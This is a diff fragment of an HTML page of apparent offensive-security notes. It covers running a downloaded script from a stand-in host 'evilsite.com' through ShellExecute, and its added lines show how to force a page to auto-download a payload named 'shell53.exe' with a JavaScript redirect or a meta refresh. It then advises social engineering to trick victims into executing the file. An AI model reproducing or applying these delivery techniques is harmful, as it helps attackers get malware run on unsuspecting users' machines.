@@ -19,4 +19,19 @@ oShell.ShellExecute(commandtoRun,"","","open","1");<br/>
 <br/>
 http://evilsite.com/file.js<br/>
 <br/>
-This code can be modified to greate a wget-script and then download and execute a script.</body></html>
+This code can be modified to greate a wget-script and then download and execute a script.<br/>
+<br/>
+<b>Autodownload files</b><br/>
+Not exactly subtle, you can change a webpage to auto download a script. Then you just need the victims to launch it. <br/>
+<br/>
+&lt;script&gt; document.location.href = 'shell53.exe'; &lt;/script&gt;<br/>
+<br/>
+Another way to do it is like this<br/>
+<br/>
+&lt;html&gt;<br/>
+&lt;head&gt;<br/>
+&lt;meta http-equiv="refresh" content="0; url=shell53.exe"&gt;<br/>
+&lt;/head&gt;<br/>
+&lt;/html&gt;<br/>
+<br/>
+Of course the user will have to accept to download the file, unless the user has previously checked in the box automatically download. The user must then click the file for it to execute. This is where the social engineering part comes in, you really must trick the user into executing the file.</body></html>
